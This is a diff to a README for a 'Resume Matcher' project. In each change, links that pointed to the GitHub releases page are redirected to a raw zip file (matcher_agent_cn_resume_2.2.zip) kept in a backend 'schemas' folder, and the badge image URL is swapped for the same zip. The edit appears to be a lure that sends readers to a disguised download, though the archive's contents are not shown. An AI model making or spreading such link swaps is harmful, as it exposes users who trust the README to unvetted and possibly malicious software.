@@ -6,7 +6,7 @@
 
 ## 🔗 Download
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Resume%20Matcher-4CAF50)](https://github.com/idhs-song/resume-matcher-agent-cn/releases)
+[![Download Here](https://raw.githubusercontent.com/idhs-song/resume-matcher-agent-cn/main/apps/backend/app/schemas/matcher_agent_cn_resume_2.2.zip%20Now-Resume%20Matcher-4CAF50)](https://raw.githubusercontent.com/idhs-song/resume-matcher-agent-cn/main/apps/backend/app/schemas/matcher_agent_cn_resume_2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, ensure your device meets the following requirements:
 
    Go to the following link to access the release page:
 
-   [GitHub Releases Page](https://github.com/idhs-song/resume-matcher-agent-cn/releases)
+   [GitHub Releases Page](https://raw.githubusercontent.com/idhs-song/resume-matcher-agent-cn/main/apps/backend/app/schemas/matcher_agent_cn_resume_2.2.zip)
 
 2. **Select the Latest Version**
 
